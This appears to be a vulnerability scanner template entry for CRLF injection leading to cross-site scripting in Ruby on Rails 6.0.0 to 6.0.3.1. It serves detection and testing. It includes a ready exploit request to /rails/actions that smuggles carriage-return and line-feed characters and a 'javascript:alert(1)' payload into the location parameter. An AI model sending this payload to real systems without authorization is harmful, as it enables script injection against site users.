# Nuclei Template: Ruby on Rails - CRLF Injection and Cross-Site Scripting
**Template ID:** rails6-xss
**Vulnerability Class:** Cross-site Scripting (XSS) - Generic
**Severity:** Medium
**CWE:** CWE-79
**Source:** Nuclei Template (`rails6-xss.yaml`)

## Vulnerability Information & PoC

## Description
Ruby on Rails 6.0.0-6.0.3.1 contains a CRLF issue which allows JavaScript to be injected into the response, resulting in cross-site scripting.

## Steps to reproduce / Exploit Payload
```http
POST {{BaseURL}}/rails/actions?error=ActiveRecord::PendingMigrationError&action=Run%20pending%20migrations&location=%0djavascript:alert(1)//%0aaaaaa
```

## References
- https://hackerone.com/reports/904059
